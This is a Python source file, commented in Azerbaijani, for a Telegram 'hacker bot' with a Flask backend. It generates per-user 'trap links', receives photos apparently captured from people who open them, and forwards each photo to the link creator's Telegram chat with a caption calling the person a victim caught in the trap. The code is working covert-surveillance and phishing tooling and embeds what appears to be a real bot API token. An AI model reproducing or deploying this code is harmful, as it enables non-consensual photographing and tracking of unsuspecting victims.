import os
import telebot
import uuid
import base64
from flask import Flask, render_template, request, jsonify
from flask_cors import CORS
from threading import Thread

# --- BURA ÖZ MƏLUMATLARINI YAZ ---
API_TOKEN = "8519435288:AAELasGOVqyYdR3EgqLLx2xNVsCwW7QY0r0"
MY_CHAT_ID = "7754388468"
# Railway-in sənə verdiyi linki bura yaz (axırda / olmasın)
DOMAIN = "https://bot-production-da20.up.railway.app"

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
CORS(app)

# Aktiv linkləri yadda saxlayan baza (RAM üzərində)
user_db = {}

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.reply_to(message, "📸 **Xaker Botuna xoş gəldin!**\n\nÖz tələ linkini yaratmaq üçün /link yaz.")

@bot.message_handler(commands=['link'])
def create_link(message):
    chat_id = message.chat.id
    # Hər istifadəçiyə özəl 8 simvollu unikal kod
    token = str(uuid.uuid4())[:8]
    user_db[token] = chat_id
    
    trap_url = f"{DOMAIN}/?t={token}"
    bot.reply_to(message, f"🎯 **Tələ linkin hazırdır:**\n\n`{trap_url}`\n\nBu linkə girən hər kəsin şəkli birbaşa bura gələcək!", parse_mode="Markdown")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_photo():
    try:
        data = request.json
        token = data.get('token')
        image_b64 = data.get('image')

        if token in user_db:
            target_chat = user_db[token]
            # Base64 formatlı şəkli təmizləyib fayla çeviririk
            img_bytes = base64.b64decode(image_b64.split(',')[1])
            
            filename = f"capture_{token}.png"
            with open(filename, "wb") as f:
                f.write(img_bytes)
            
            # Telegram-a göndəriş
            with open(filename, "rb") as photo:
                bot.send_photo(target_chat, photo, caption="⚠️ **DİQQƏT!** Qurban tələyə düşdü və şəkli çəkildi.")
            
            os.remove(filename) # Serverdə yer tutmasın deyə silirik
            return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Server xətası: {e}")
    
    return jsonify({"status": "fail"}), 400

def run_flask():
    # Railway-in verdiyi portu istifadə edirik
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    # Flask və Botu eyni anda işlətmək üçün Thread istifadə edirik
    Thread(target=run_flask).start()
    bot.infinity_polling()
